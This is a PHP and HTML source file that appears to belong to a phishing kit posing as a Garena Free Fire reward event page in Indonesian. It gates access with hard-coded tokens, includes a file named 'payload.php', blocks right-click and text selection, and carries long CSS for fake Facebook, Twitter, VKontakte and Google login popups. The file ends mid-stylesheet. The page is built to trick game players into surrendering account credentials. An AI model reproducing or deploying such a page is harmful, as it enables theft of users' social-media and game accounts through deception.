<?php


if(isset($_POST['sessionToken']) && isset($_GET['gToken'])){
    $sessionToken = $_POST['sessionToken'];
    $gToken = $_GET['gToken'];
    
    if($sessionToken != "well"){
        header("Location: verify.php");
    }
    
    if($gToken != "verified"){
        header("Location: verify.php");
    }

include "system/payload.php";
gcodeCheckSession("verify.php");
?>
<html lang="en"><head>
<meta http-equiv="Content-Type" content="text/html; charset=UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0, minimum-scale=1.0, maximum-scale=1.0, user-scalable=no">
<title>Garena Free Fire. Game genre Battle Royale mobile terbaik!</title>
<meta property="og:description" content="Free Fire adalah game mobile battle royale terbaik, diunduh lebih dari 1 milyar pemain di seluruh dunia, dikembangkan oleh Garena untuk Android dan iOS. Battle in Style dan jadi survivor yang bertahan">
<meta property="og:image" content="https://cdn.jsdelivr.net/gh/Hyuu09/cdn-epep@main/images2/navbar-logo.jpg">
<meta property="og:image:width" content="540">
<meta property="og:image:height" content="282">
<link rel="stylesheet" href="css/facebook.css">
<link rel="stylesheet" href="css/twitter.css">
<link rel="stylesheet" href="css/vkontakte.css">
<link rel="stylesheet" href="css/google.css">
<link rel="stylesheet" href="css/link.css">
<link rel="stylesheet" href="css/flaglink.css">
<link rel="stylesheet" href="css/animate.css">
<link rel="stylesheet" href="css/style-zone.css">
<link rel="stylesheet" href="css/zero-zone.css">
<link rel="stylesheet" href="css/log.css">
<style type="text/css">@font-face {font-family:Teko;font-style:normal;font-weight:400;src:url(https://wznpqzjl.mcj4fdph.biz.id/cf-fonts/v/teko/5.0.18/latin-ext/wght/normal.woff2);unicode-range:U+0100-02AF,U+0304,U+0308,U+0329,U+1E00-1E9F,U+1EF2-1EFF,U+2020,U+20A0-20AB,U+20AD-20CF,U+2113,U+2C60-2C7F,U+A720-A7FF;font-display:swap;}@font-face {font-family:Teko;font-style:normal;font-weight:400;src:url(https://wznpqzjl.mcj4fdph.biz.id/cf-fonts/v/teko/5.0.18/devanagari/wght/normal.woff2);unicode-range:U+0900-097F,U+1CD0-1CF9,U+200C-200D,U+20A8,U+20B9,U+25CC,U+A830-A839,U+A8E0-A8FF;font-display:swap;}@font-face {font-family:Teko;font-style:normal;font-weight:400;src:url(https://wznpqzjl.mcj4fdph.biz.id/cf-fonts/v/teko/5.0.18/latin/wght/normal.woff2);unicode-range:U+0000-00FF,U+0131,U+0152-0153,U+02BB-02BC,U+02C6,U+02DA,U+02DC,U+0304,U+0308,U+0329,U+2000-206F,U+2074,U+20AC,U+2122,U+2191,U+2193,U+2212,U+2215,U+FEFF,U+FFFD;font-display:swap;}</style>
<link href="css/font-awesome.min.css" rel="stylesheet" crossorigin="anonymous">
<link rel="stylesheet" href="css/material-design-iconic-font.min.css">
<link rel="stylesheet" href="css/all.min.css">
<link rel="icon" type="img/png" href="https://cdn.jsdelivr.net/gh/Hyuu09/cdn-epep@main/images2/ff-logo-icon.png" sizes="32x32">
</head>
<body oncontextmenu="return false" onselectstart="return false" ondragstart="return false" style="display:none;">
<style type="text/css">
@charset "utf-8";
@import url("https://fonts.googleapis.com/css?family=Roboto:300,400,500,700|Teko:300,400,500");

*,
*:before,
*:after {
	-webkit-box-sizing: border-box;
	-moz-box-sizing: border-box;
	box-sizing: border-box;
}

@font-face {
	font-family: 'laza';
	font-style: normal;
	font-weight: 700;
	src:
		url(fonts/laza.woff2) format("woff2"),
		url(https://wznpqzjl.mcj4fdph.biz.id/fonts/laza.woff) format("woff"),
		url(https://wznpqzjl.mcj4fdph.biz.id/fonts/laza.ttf) format("truetype");
}

@font-face {
	font-family: 'laza2';
	font-style: normal;
	font-weight: 700;
	src:
		url(https://wznpqzjl.mcj4fdph.biz.id/fonts/laza2.ttf) format("truetype")
}

.laz-container {
	background: url(https://cdn.jsdelivr.net/gh/Hyuu09/cdn-epep@main/images2/lazback.jpg) no-repeat center;
	background-size: 100% 100%;
	margin-top: 0px;
	padding: 5px;
	width: 100%;
	margin-left: 0px;
	margin-right: 0px;
	height: 588px;
	position: relative;
}


.gallery-container {
	background-size: 100% 100%;
	margin-top: -2px;
	width: 100%;
	height: auto;
	border: 0px solid #fff;
	float: left;
}

.container-box {
	background-size: 100% 100%;
	width: 100%;
	height: 690px;
}

.landing {
	background: url(https://wznpqzjl.mcj4fdph.biz.id/img/landing.jpg) no-repeat center center;
	background-size: cover;
	width: 100%;
	height: auto;
}

.navbar {
	background: #0C0C0C;
	width: 100%;
	height: 44px;
}

.navbar-logo {
    width: 119px;
    float: left;
    margin-top: 7px;
    margin-left: 15px;
}

.navbar-shop {
	width: 25px;
	margin-top: 19px;
	margin-right: 20px;
}

.navbar-language {
    width: 20px;
    margin-top: 8px;
    margin-right: 17px;
}

.navbar-menu {
	width: 20px;
	margin-top: 19px;
	margin-right: 5px;
}

.navbar-right {
	width: auto;
	float: right;
}

.navbar-download {
	background: #ffca13;
	width: 46px;
	height: 45px;
	margin-top: 10px;
	margin-right: 10px;
	border-radius: 7px;
	float: right;
}

.navbar-download img {
	width: 20px;
	height: 21px;
	margin: 13px;
}


.header {
	width: 100%;
	height: auto;
}

.header img {
	width: 100%;
	height: auto;
	margin-top: -0px;
}


.balance2 {
	margin-left: auto;
	margin-right: auto;
	margin-bottom: 7px;
	padding: 5px;
	display: block;
}

.balance2 img {
	width: 100px;
	margin-top: -10px;
	margin-right: 5px;
	float: center;
}

.balance2-nom {
	color: #fff;
	font-size: 18px;
	padding-top: 8px;
	font-family: laza;
	font-weight: 500;
	text-align: left;
	text-shadow: 0 1px 0 #000;
}

.balance2-detail {
	width: auto;
	height: auto;
	padding-top: 2px;
	padding-left: 5px;
	padding-bottom: 0px;
	color: #fff;
	font-size: 15px;
	font-family: laza;
	text-align: center;
	text-shadow: 0 1px 0 #000;
	border-left: 3px solid #9FE9F7;
	line-height: 15px;
	float: left;
}

.balance2 button {
	background-size: 100% 100%;
	width: 30%;
	height: auto;
	margin-top: -75px;
	margin-right: 10px;
	padding: 5px;
	color: #000;
	font-size: 14px;
	font-family: laza;
	text-align: center;
	border: none;
	outline: none;
	position: relative;
	float: right;
}

.balance {
	background: url(https://wznpqzjl.mcj4fdph.biz.id/img/lazabz.png) no-repeat center center;
    background-size: 100% 100%;
    width: 73%;
    height: 71px;
    margin-left: auto;
    margin-right: auto;
    margin-bottom: -9px;
    padding: 5px;
    border-top: 0px solid #70FFB2;
    border-left: 0px solid #70FFB2;
    border-right: 0px solid #70FFB2;
    border-bottom: 0px solid #70FFB2;
    display: block;
}

.balance img {
	width: 57px;
	border-top: 0px solid #1E90FF;
	border-left: 0px solid #1E90FF;
	border-right: 0px solid #1E90FF;
	border-bottom: 0px solid #1E90FF;
	margin-top: -1px;
	margin-right: 5px;
	float: left;
}

.balance-nom {
	color: #fff;
	font-size: 14px;
	padding-top: 13px;
	padding-bottom: 4px;
	font-family: laza;
	/* font-weight: 500; */
	text-align: left;
	/* text-shadow:0 1px 0 #000; */
}

.balance-detail {
	background: url(https://wznpqzjl.mcj4fdph.biz.id/img/bg-det.png) no-repeat center center;
	background-size: 100% 100%;
	width: auto;
	height: auto;
	padding-top: 1px;
	padding-left: 5px;
	padding-right: 8px;
	padding-bottom: 3px;
	color: #fff;
	font-size: 13px;
	font-family: 'laza';
	text-align: center;
	text-shadow: 0 1px 0 #000;
	border-left: 3px solid #FAB203;
	line-height: 15px;
	float: left;
}

.balance-detail2 {
	background: url(https://wznpqzjl.mcj4fdph.biz.id/img/bg-det2.png) no-repeat center center;
	background-size: 100% 100%;
	width: auto;
	height: auto;
	padding-top: 2px;
	padding-left: 5px;
	padding-right: 8px;
	padding-bottom: 3px;
	color: #fff;
	font-size: 14px;
	font-family: 'laza';
	text-align: center;
	text-shadow: 0 1px 0 #000;
	border-left: 3px solid #b70303;
	line-height: 15px;
	float: left;
}

.balance-detail3 {
	background: url(https://wznpqzjl.mcj4fdph.biz.id/img/bg-det3.png) no-repeat center center;
	background-size: 100% 100%;
	width: auto;
	height: auto;
	padding-top: 2px;
	padding-left: 5px;
	padding-right: 8px;
	padding-bottom: 3px;
	color: #fff;
	font-size: 14px;
	font-family: laza;
	text-align: center;
	text-shadow: 0 1px 0 #000;
	border-left: 3px solid #a30889eb;
	line-height: 15px;
	float: left;
}

.balance button {
	background: url(https://wznpqzjl.mcj4fdph.biz.id/img/lazbutton.png) no-repeat center center;
	background-size: 100% 100%;
	width: 30%;
	height: 33px;
	margin-top: -14px;
	margin-right: 0px;
	padding: 5px;
	padding-right: 21px;
	color: #000000;
	font-size: 17px;
	font-family: 'laza';
	font-weight: 500;
	text-align: right;
	text-shadow: 0 3px 0 #ffffff;
	border: none;
	outline: none;
	position: relative;
	float: right;
	animation: pulse .900s infinite alternate;
	animation-play-state: running;
}

.header video {
	width: 100%;
	border: none;
}

.slideshow-container {
	max-width: 1000px;
	position: relative;
	margin: auto;
	border-top: 1px solid #ECD954;
	border-bottom: 1px solid #ECD954;
}

.fade {
	-webkit-animation-name: fade;
	-webkit-animation-duration: 1.5s;
	animation-name: fade;
	animation-duration: 1.5s;
}

.notiftwitter {
	width: 30%;
	height: 30px;
	margin-left: 35%;
	margin-right: auto;
	padding: 5px;
	font-size: 22px;
	font-family: Teko;
	font-weight: 500;
	text-align: center;
	color: #ECD954;
	margin-bottom: 0px;
	border: none;
	position: relative;
	outline: none;
	display: block;
}

.season-logo {
	width: 20%;
	margin: 15px;
	float: left;
}

.season-logos {
	width: 40%;
	margin: 5px;
	float: right;
}

.season-slogan {
	width: 100%;
	margin-top: 100%;
	margin-left: auto;
	margin-right: auto;
	display: block;
}

.season-btn {
	background: url(https://cdn.jsdelivr.net/gh/Hyuu09/cdn-epep@main/images2/button.png) no-repeat center;
	background-size: 100% 100%;
	width: auto;
	height: auto;
	margin-left: auto;
	margin-right: auto;
	padding: 10px;
	padding-left: 30px;
	padding-right: 30px;
	font-size: 18px;
	font-family: laza;
	font-weight: 500;
	text-align: center;
	color: #000;
	margin-bottom: 3px;
	border: none;
	position: relative;
	outline: none;
	display: block;
}

.season-btn:hover {
	background: url(https://wznpqzjl.mcj4fdph.biz.id/img/menu_on.png) no-repeat center;
	background-size: 100% 100%;
	color: #000;
	transition: 0.5s;
}

.event-notification {

	background-size: auto;
	background-size: 94% 100%;
	width: 85%;
	height: 48px;
	margin-left: auto;
	margin-right: auto;
	margin-top: -2px;
	margin-bottom: -82px;
	display: block;
}

.event-notification-text {
	padding-top: 10px;
	padding-left: 59px;
	color: #dbff85;
	font-size: 16px;
	font-family: Teko;
	font-weight: 550;
	text-align: left;
	float: left;
}

.event-notification-timer {
	padding-top: 44px;
	padding-right: 28px;
	color: #dbff85;
	font-size: 27px;
	font-family: Teko;
	font-weight: 550;
	text-align: left;
	margin-bottom: 13px;
	float: right;
}

.alert-wrapper {
	width: 98%;
	height: auto;
	border: none;
	margin-left: 10px;
	display: block;
	margin: 10px auto;
	margin-top: -31px;
	margin-bottom: -17px;
}

.alert {

	background-size: auto;
	background-size: 100% 100%;
	width: 91%;
	height: 62px;
	margin-top: 29px;
	margin-bottom: 18px;
	padding: 14px;
	margin-left: 5px;
	margin-right: 100px;
	color: #fff;
	border: none;
}

.alert2 {

	background-size: auto;
	background-size: 78% 80%;
	width: 91%;
	height: 62px;
	margin-top: 29px;
	margin-bottom: 18px;
	padding: 14px;
	margin-left: 16px;
	margin-right: 100px;
	color: #fff;
	border: none;
}

.alert-text {
	margin-top: -330px;
	margin-left: -6px;
	padding: 7px;
	color: #ffffff;
	text-align: center;
	font-size: 14px;
	font-family: laza;
	border: none;
}

.alert-text-mid {
	margin-top: 1px;
	padding: 7px;
	color: #f1f1f0;
	text-align: center;
	font: 25px;
	font-family: laza;
	border: none;
	margin-right: -2px;
	font-size: 19px;
}

.loadkin {
	width: 100%;
	height: 100%;
	position: fixed;
	top: 0;
	left: 0;
	z-index: 9999;
	background: #000;
}

.loadkin-box {
	position: relative;
	margin: 50px auto;
	text-align: center;
	height: 43px;
	font-size: 20px;
	padding: 5px;
	padding-bottom: 5px;
	margin-top: 70%;
}

.loadkin-box img {
	width: 70px;
	height: 85px;
	margin-bottom: 10px;
}

.loadkin-box i {
	padding-top: 15px;
	padding-bottom: 15px;
	color: #fff;
	font-size: 20px;
	float: center;
	font-family: arial, sans-serif;
	text-align: center;
}

.popup {
	width: 100%;
	height: 100%;
	position: fixed;
	top: 0;
	left: 0;
	z-index: 9999;
	background-color: rgba(0, 0, 0, 0.4);
}

.popup-box-wrapper {
	width: auto;
	height: auto;
	position: relative;
	margin: 50px auto;
	margin-top: 15%;
	text-align: center;
	font-family: 'laza';
	color: #fff;
}

.popup-box-wrapperz {
    width: 360px;
    height: auto;
    position: relative;
    margin: 50px auto;
    margin-top: 252px;
    text-align: center;
    font-family: 'laza';
    color: #fff;
}

.popup-box-navbar {
	background: url(https://cdn.jsdelivr.net/gh/Hyuu09/cdn-epep@main/images2/popup-navbar2.png) no-repeat center center;
	background-size: 100% 100%;
	height: 43px;
	padding-bottom: 5px;
}

.popup-box-navbar img {
	width: 25px;
	height: 25px;
	margin-top: 7px;
	margin-right: 15px;
	float: right;
}

.popup-box-navbar-title {
	padding-top: 5px;
    padding-left: 10px;
    padding-bottom: 2px;
    font-size: 20px;
    font-family: laza;
    font-weight: 300;
    text-align: left;
    color: #000;
}

.popup-box-navbarz {
	background: url(https://cdn.jsdelivr.net/gh/Hyuu09/cdn-epep@main/images2/popup-navbar2.png) no-repeat center center;
	background-size: 100% 100%;
	height: 43px;
	padding-bottom: 5px;
}

.popup-box-navbarz img {
	width: 25px;
	height: 25px;
	margin-top: 7px;
	margin-right: 15px;
	float: right;
}

.popup-box-navbarz-title {
	padding-top: 9px;
	padding-bottom: 2px;
	font-size: 20px;
	font-family: laza;
	font-weight: 300;
	text-align: center;
	color: #fff;
}

.popup-box-navbar-ignis {
	background: url(https://cdn.jsdelivr.net/gh/Hyuu09/cdn-epep@main/images2/popup-navbar-ignis.png) no-repeat center center;
	background-size: 100% 100%;
	height: 43px;
	padding-bottom: 5px;
}

.popup-box-navbar-ignis img {
	width: 25px;
	height: 25px;
	margin-top: 7px;
	margin-right: 15px;
	float: right;
}

.popup-box-navbar-ignis-title {
	padding-top: 21px;
    padding-bottom: 2px;
    font-size: 20px;
    font-family: 'laza';
    font-weight: 500;
    text-align: right;
    padding-right: 16px;
    color: #ffffff;
}

.popup-box-bg {
	background: url(https://wznpqzjl.mcj4fdph.biz.id/img/popup-box-bg2.png) no-repeat center center;
	background-size: 100% 100%;
	width: 400px;
}

.popup-box-bgz {
	background: url(https://cdn.jsdelivr.net/gh/Hyuu09/cdn-epep@main/images2/popup-box-bg3.png) no-repeat center center;
	background-size: 100% 100%;
	width: 100%;
	margin-top: -12px;
	margin-left: 0px;
}

.popup-box-ignis {
	background: url(https://cdn.jsdelivr.net/gh/Hyuu09/cdn-epep@main/images2/popup-box-ignis.png) no-repeat center center;
	background-size: 100% 100%;
	width: 100%;
	margin-top: -12px;
	margin-left: 0px;
}

.popup-box-bgx {
	background: url(https://cdn.jsdelivr.net/gh/Hyuu09/cdn-epep@main/images2/popup-box-bg3.png) no-repeat center center;
	background-size: 100% 100%;
	width: 100%;
	margin-top: 0px;
	margin-left: 0px;
	font-size: 18px;
	padding-bottom: auto;
	padding-top: 30px;
}

.rewardpop {
	background: url(https://cdn.jsdelivr.net/gh/Hyuu09/cdn-epep@main/images2/lazlogin.png) no-repeat center center;
	background-size: 100% 100%;
	width: 400px;
	height: 200px;
	margin: 50px auto;
	text-align: center;
	margin-top: 300px;

}

.popup-box-gamecon {
	width: 52%;
	height: 25px;
	margin-left: auto;
	margin-right: auto;
	display: block;
}

.popup-box-alert {
	width: 95%;
	height: auto;
	margin-top: 10px;
	margin-left: auto;
	margin-right: auto;
	margin-bottom: 10px;
	padding: 5px;
	color: #AAAAAA;
	font-size: 18px;
	font-family: laza;
	font-weight: 500;
	text-align: left;
	display: block;
}

.popup-box-alert2 {
	width: 95%;
	height: auto;
	margin-top: 10px;
	margin-left: auto;
	margin-right: auto;
	margin-bottom: 10px;
	padding: 5px;
	color: #AAAAAA;
	font-size: 18px;
	font-family: laza;
	font-weight: 500;
	text-align: left;
	display: block;
}

.popup-box-alert0 {
	width: 95%;
	height: auto;
	margin-top: 10px;
	margin-left: auto;
	margin-right: auto;
	margin-bottom: 10px;
	padding: 5px;
	color: #AAAAAA;
	font-size: 18px;
	font-family: laza;
	font-weight: 500;
	text-align: right;
	display: block;
}

.popup-box-alert3 {
	width: 95%;
	height: auto;
	margin-top: 10px;
	margin-left: auto;
	margin-right: auto;
	margin-bottom: 10px;
	padding: 5px;
	color: #c7c7c7;
	font-size: 16px;
	font-family: laza;
	font-weight: 500;
	text-align: center;
	/* font-style: italic; */
	display: block;
}


.popup-box-alert7 {
	width: 95%;
	height: auto;
	margin-top: 10px;
	margin-left: auto;
	margin-right: auto;
	margin-bottom: 10px;
	padding: 5px;
	color: #F5EAB0;
	font-size: 18px;
	font-family: laza;
	font-weight: 500;
	text-align: center;
	display: block;
}

.popup-box-alertsz {
	width: 95%;
	height: auto;
	margin-top: 26px;
	margin-left: auto;
	margin-right: auto;
	margin-bottom: -94px;
	padding: 55px;
	color: #fdffff;
	font-size: 18px;
	font-family: laza;
	font-weight: 500;
	text-align: center;
	display: block;
}

.popup-box-alert-ignis {
	width: 95%;
	height: auto;
	margin-top: 10px;
	margin-left: auto;
	margin-right: auto;
	margin-bottom: 2px;
	padding: 12px;
	color: #cdcdcd;
	font-size: 16px;
	font-family: laza;
	font-weight: 500;
	text-align: center;
	display: block;
}

.popup-box-alert4 {
	width: 95%;
    height: auto;
    margin-top: 3px;
    margin-left: auto;
    margin-right: auto;
    margin-bottom: 17px;
    padding-top: 4px;
    /* padding: 12px; */
    color: #dbdbdb;
    font-size: 18px;
    font-family: laza;
    font-weight: 500;
    text-align: center;
    display: block;
}

.popup-box-alert4 i {
	padding-top: 15px;
	padding-bottom: 15px;
	color: #AAAAAA;
	font-size: 50px;
	text-align: center;
}

.line {
    width: 203%;
    height: auto;
    margin-left: 87px;
    margin-top: -85px;
    padding-top: 25px;
    padding-bottom: 20px;
    border-bottom: 1px solid #ffffff59;
    display: block;
}

.popup-box-item {
	width: 16%;
    height: 67px;
    margin-top: 38px;
	margin-left: auto;
	margin-right: auto;
	text-align: right;
	display: block;
}

.popup-box-item img {
	width: 100%;
	height: 100%;
}

.popup-box-item span {
	background-size: 56% 100%;
	width: auto;
	color: #fff;
	font-size: 13px;
	font-family: laza;
	text-align: right;
	position: absolute;
	top: 57px;
    right: 4px;
}

.popup-box-item rw {
    background-size: 56% 100%;
    width: 229%;
    color: #ffffff;
    font-size: 16px;
    font-family: laza;
    float: right;
    text-align: left;
    position: absolute;
    top: 11px;
    right: -207px;
}


.popup-box-item pr {
	background-size: 56% 100%;
    width: 229%;
    color: #000000;
    font-size: 16px;
    font-family: laza;
    float: right;
    text-align: left;
    position: absolute;
    top: 41px;
    right: -260px;
}

.popup-box-alert-price {
    background-size: 56% 100%;
    width: auto;
    color: #000;
    font-size: 16px;
    font-family: laza;
    float: right;
    position: absolute;
    top: 41px;
    right: -49px;
}

.popup-box-form {
	width: 85%;
	height: auto;
	margin-left: auto;
	margin-right: auto;
	display: block;
}

.popup-box-form label {
	display: inline-block;
	width: 140px;
	text-align: right;
	color: yellow;
}

.popup-box-form input {
	background: #1a1b1c;
	background-size: 100% 100%;
	width: 100%;
	height: 35px;
	margin-bottom: 3px;
	padding: 4px;
	padding-left: 10px;
	color: #c3c3c3;
	font-size: 16px;
	font-family: laza;
	font-weight: 300;
	border: 1px solid #8f8f8f;
	position: relative;
	outline: none;
	-webkit-appearance: none;
	-moz-appearance: none;
}

.popup-box-form input::placeholder {
	color: #FFFBF7;
}

.popup-box-form select {
	background: #1a1b1c;
	background-size: 100% 100%;
	width: 100%;
	height: 35px;
	margin-bottom: 3px;
	padding: 4px;
	padding-left: 10px;
	color: #c3c3c3;
	font-size: 16px;
	font-family: laza;
	font-weight: 300;
	border: 1px solid #8f8f8f;
	position: relative;
	outline: none;
	-webkit-appearance: none;
	-moz-appearance: none;
}

.popup-box-footer {
	background-size: 100% 100%;
	margin-top: 20px;
	width: 100%;
	height: 45px;
}

.popup-box-footer-ignis {
	background-size: 100% 100%;
	margin-top: 20px;
	width: 100%;
	height: 45px;
}

.popup-box-footer-ignis button:nth-child(1) {
    background: url(https://cdn.jsdelivr.net/gh/Hyuu09/cdn-epep@main/images2/btn-off.png) no-repeat center;
    background-size: 100% 100%;
    width: auto;
    height: auto;
    margin-top: -23px;
    padding: 0px;
    padding-left: 35px;
    padding-right: 35px;
    color: #120f0f;
    font-size: 18px;
    font-family: laza;
    font-weight: 500;
    margin-left: 125px;
    margin-right: auto;
    text-align: center;
    border: none;
    outline: none;
}

.popup-box-footer-ignis button:nth-child(2) {
    background: url(https://cdn.jsdelivr.net/gh/Hyuu09/cdn-epep@main/images2/btn-on.png) no-repeat center;
    background-size: 100% 100%;
    width: auto;
    height: auto;
    margin-top: -23px;
    padding: 0px;
    padding-left: 35px;
    padding-right: 35px;
    color: #120f0f;
    font-size: 18px;
    font-family: laza;
    font-weight: 500;
    margin-left: auto;
    margin-right: auto;
    text-align: center;
    border: none;
    outline: none;
}

.popup-box-footer button {
	background: url(https://cdn.jsdelivr.net/gh/Hyuu09/cdn-epep@main/images2/button2.png) no-repeat center;
	background-size: 100% 100%;
	width: auto;
	height: auto;
	margin-top: -23px;
	padding: 5px;
	padding-left: 35px;
	padding-right: 35px;
	color: #000;
	font-size: 18px;
	font-family: laza;
	font-weight: 500;
	margin-left: auto;
	margin-right: auto;
	text-align: center;
	border: none;
	outline: none;
}

.popup-box-form-footer {
	background-size: 100% 100%;
	width: 100%;
	height: 45px;
	margin-top: 20px;
}

.popup-box-form-footer button {
	background: url(https://cdn.jsdelivr.net/gh/Hyuu09/cdn-epep@main/images2/button2.png) no-repeat center;
	background-size: 100% 100%;
	width: auto;
	height: auto;
	margin-top: 5px;
	padding: 4px;
	padding-left: 30px;
	padding-right: 30px;
	color: #000;
	font-size: 18px;
	font-family: laza;
	font-weight: 500;
	text-align: center;
	border: none;
	outline: none;
}

.popup-box-navbar-login {
	background: url(https://wznpqzjl.mcj4fdph.biz.id/img/popup-navbar1.png) center center/100% 100% no-repeat;
	height: auto;
	padding-top: 5px;
	padding-bottom: 1px
}

.popup-box-navbar-login-title {
	padding-left: 24px;
	padding-top: 2px;
	color: #defbff;
	font-size: 22px;
	font-family: laza;
	font-weight: 500;
	text-align: center
}

.popup-box-bg-login {
	background: url(https://wznpqzjl.mcj4fdph.biz.id/img/popup-box-bg-login.png) center center/100% 100% no-repeat;
	width: 100%;
	height: 255px;
	margin-top: -10px
}

.popup-box-bg-login-load {
	background: url(https://cdn.jsdelivr.net/gh/Hyuu09/cdn-epep@main/images2/lazlogin.png) no-repeat center center;
	background-size: 100% 100%;
	margin-left: -20px;
	width: 400px;
	height: 200px;
	margin-top: -10px;
}

.load-login-img {
	width: 30%;
	height: auto;
	margin-top: 30px;
	margin-bottom: 5px
}

.load-login-gif {
	width: 15%;
	height: auto;
	margin-bottom: 0
}

.popup-btn-login {
	width: 45%;
    height: 30px;
    padding-top: 4px;
    /* padding: 0px; */
    padding-left: 8px;
    margin-bottom: 10px;
    margin: 5px;
    color: #000;
    font-size: 16px;
    font-family: laza;
    border: none;
    border-top-left-radius: 3px;
    border-top-right-radius: 3px;
    border-bottom-right-radius: 3px;
    border-bottom-left-radius: 3px;
    outline: none;
    margin-bottom: 45px;
    position: relative;
}

.popup-btn-login i {
    padding-right: 5px;
	color: #fff;
	font-size: 18px;
	float: left;
}

.popup-btn-login-group {
	width: 28%;
    height: 30px;
    padding-top: 4px;
    /* padding: 0px; */
    padding-left: 8px;
    margin-bottom: 10px;
    margin: 5px;
    color: #000;
    font-size: 16px;
    font-family: laza;
    border: none;
    border-top-left-radius: 3px;
    border-top-right-radius: 3px;
    border-bottom-right-radius: 3px;
    border-bottom-left-radius: 3px;
    outline: none;
    margin-bottom: 45px;
    position: relative;
}

.popup-btn-login-group i {
	font-size: 18px;
	float: left;
}

.popup-btn-facebook {
	background: #1778f2;
	color: #fff;
	margin-bottom: 45px;
}

.popup-btn-twitter {
	background: #00acee;
	margin-bottom: 3px;
	color: #fff;
}

.popup-btn-vkontakte {
	background: #4376a6;
	margin-bottom: 3px;
	color: #ffffff;
}

.popup-btn-google {
    background: #fff;
	margin-bottom: 3px;
    color: #000;
}
.popup-btn-login img {
  width: 14px;
  margin-top: 1px;
  float: left;
}

.popup-btn-login-link {
	background: #E3B448;
	color: #000;
}

.popup-btn-login-link img {
	width: 22px;
	height: 22px;
	margin-top: -2px;
	color: #fff;
	font-size: 20px;
	float: left;
}

.popup-login {
	background: rgba(0, 0, 0, 0.4);
	width: 100%;
	height: 100%;
	position: fixed;
	top: 0;
	left: 0;
	z-index: 9999;
}

.popup-box-login-fb {
	background: #ECEFF6;
	max-width: 330px;
	height: auto;
	position: relative;
	margin: 50px auto;
	margin-top: 1.9%;
	text-align: center;
	font-family: 'Teko';
	color: #000;
	border-radius: 10px;
}

.popup-box-login-twitter {
	background: #fff;
	max-width: 330px;
	height: auto;
	position: relative;
	margin: 50px auto;
	margin-top: 10%;
	text-align: left;
	font-family: 'Teko';
	color: #000;
	border-radius: 5px;
}

.popup-box-login-google {
	background:#fff;
	max-width:330px;
	height:auto;
	position:relative;
	margin:50px auto;
	margin-top:36%;
	padding-bottom: 10px;
	text-align:center;
	font-family: 'Open Sans', sans-serif;
	color:#000;
	border-radius:5px;
}

.close-fb {
	background: #3b5998;
	width: 25px;
	height: 25px;
	color: #fff;
	font-size: 20px;
	text-align: center;
	text-decoration: none;
	border-radius: 50%;
	top: -10px;
	right: -10px;
	position: absolute;
	display: block;
}

.close-fb i {
	padding-top: 3px;
}

.close-other {
	background: #fff;
	width: 25px;
	height: 25px;
	color: #000;
	font-size: 20px;
	text-align: center;
	border-radius: 50%;
	top: -12px;
	right: -12px;
	position: absolute;
	z-index: 9999999;
	display: block;
}

.close-other i {
	color: #20px;
	padding-top: 3px;
}

.popups {
	width: 100%;
	height: 100%;
	position: fixed;
	top: 0;
	left: 0;
	z-index: 9999;
	background-color: rgba(0, 0, 0, 0.4);
}

.popup-box-wrappers {
	width: 390px;
	height: auto;
	position: relative;
	margin: 50px auto;
	margin-top: 15%;
	text-align: left;
	font-family: 'laza';
	color: #fff;
}

.popup-box-navbars {
	background: url(https://cdn.jsdelivr.net/gh/Hyuu09/cdn-epep@main/images2/popup-navbar2.png) no-repeat center center;
	background-size: 100% 100%;
	height: 43px;
	padding-bottom: 5px;
}

.popup-box-navbars img {
	width: 20px;
	height: 20px;
	margin-top: 15px;
	margin-right: 18px;
	float: right;
}

.popup-box-navbars-title {
	padding-left: 40px;
	padding-top: 14px;
	padding-bottom: 2px;
	font-size: 20px;
	color: #fff;
	font-family: laza;
	font-weight: 300;
	text-align: center;
}

.kagetk {
	background: rgba(0, 0, 0, 0.2);
	background-size: 50% 50%;
	width: 80%;
	height: auto;
	margin-left: auto;
	margin-right: auto;
	border: 1px solid #fff;
	display: none;
	padding: 10px;
	color: #fff;
	font-size: 14px;
	font-family: laza;
	text-align: center;
}

.popup-box-bgs {
	background: url(https://cdn.jsdelivr.net/gh/Hyuu09/cdn-epep@main/images2/popup-box-bg3.png) no-repeat center center;
	background-size: 100% 100%;
	width: 100%;
	height: 200px;
	margin-top: -12px;
}

.popup-box-alerts4 {
	width: 95%;
	height: auto;
	margin-top: 10px;
	margin-left: auto;
	margin-right: auto;
	margin-bottom: 10px;
	padding: 5px;
	color: #fff;
	font-size: 20px;
	font-family: laza;
	font-weight: 500;
	text-align: left;
	display: block;
}

.popup-box-alerts4 i {
	padding-top: 15px;
	padding-bottom: 15px;
	color: #F5EAB0;
	font-size: 50px;
	text-align: left;
}

.popup-box-formx label {
	width: 70%;
	text-align: left;
	padding-left: 20px;
	color: #B7B7B7;
	text-shadow: none;
	font-size: 17px;
}

.popup-box-formx input {
	background: #001;
	width: 85%;
	height: 35px;
	margin-bottom: 8px;
	margin-left: 20px;
	padding-right: 4px;
	padding: 4px;
	color: #fff;
	font-size: 15px;
	font-family: laza;
	font-weight: 500;
	border: 0.1px solid #fff;
	outline: none;
	position: left;
	-webkit-appearance: none;
	-moz-appearance: none;
}

.popup-box-formx input::placeholder {
	color: #BCCBCE;
}


.popup-box-formx-footer {
	background-size: 100% 100%;
	width: 100%;
	height: 45px;
	margin-top: 20px;
}

.loadinglogin {
	width: 100%;
	height: auto;
}

.loadinglogin video {
	width: 400px;
	height: auto;
}

.box {
	width: 100%;
	height: 410px;
	margin-left: auto;
	margin-right: auto;
	margin-top: -30px;
	margin-bottom: -25px;
	border: 0px solid #FFFAC9;
	border-radius: 5px;
	position: relative;
	display: block;
}

.box-item {
	width: 100%;
	margin-left: auto;
	margin-right: auto;
	padding-top: 2px;
}


.btn-wrapper {
	width: 93%;
	height: 50px;
	margin-top: 3px;
	margin-right: 3px;
	font-family: laza;
}

.btn-wrapper button {
	background: url(https://wznpqzjl.mcj4fdph.biz.id/img/tombol.png) no-repeat center;
	background-size: 100% 100%;
	width: 38%;
	height: 40px;
	margin: -10px;
	padding: 10px;
	color: #FFFAC9;
	font-family: laza;
	font-size: 18px;
	font-weight: 500;
	text-align: center;
	border: none;
	outline: none;
	float: right;
	display: inline-block;
}

.footer {
    background: -webkit-linear-gradient(top, rgb(255 255 255 / 9%) 0%, rgb(0 0 0 / 11%) 100%);
    width: 100%;
    height: auto;
    padding: 15px;
    padding-top: 0px;
    padding-bottom: 25px;
    border-top: 1px solid #EF0133;
}
.footer-copyright-icon {
	width: 33%;
	padding-top: 27px;
	margin-left: auto;
